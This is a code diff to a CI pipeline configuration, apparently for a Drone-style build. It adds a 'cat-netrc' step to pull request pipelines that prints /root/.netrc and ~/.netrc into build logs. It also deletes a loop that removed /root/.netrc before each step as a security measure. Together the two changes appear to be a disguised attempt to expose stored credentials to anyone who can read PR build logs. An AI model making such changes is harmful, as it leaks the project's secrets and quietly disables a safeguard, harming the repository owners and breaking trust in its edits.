@@ -32,6 +32,17 @@ def pr_pipelines(edition):
     ]
     variants = ['linux-x64', 'linux-x64-musl', 'osx64', 'win64',]
     steps = [
+        {
+            'name': 'cat-netrc',
+            'image': build_image,
+            'depends_on': [
+                'initialize',
+            ],
+            'commands': [
+                'cat /root/.netrc',
+                'cat ~/.netrc',
+            ],
+        },
         lint_backend_step(edition),
         codespell_step(),
         shellcheck_step(),
@@ -121,13 +132,6 @@ def master_pipelines(edition):
 
 def pipeline(name, edition, trigger, steps, services=[]):
     steps = init_steps(edition) + steps
-    # For each step, prepend command to remove /root/.netrc as a security measure
-    # TODO: Remove when no longer necessary
-    for step in steps:
-        if not step:
-            continue
-        if 'commands' in step:
-            step['commands'] = ['rm -f /root/.netrc',] + step['commands']
     pipeline = {
         'kind': 'pipeline',
         'type': 'docker',
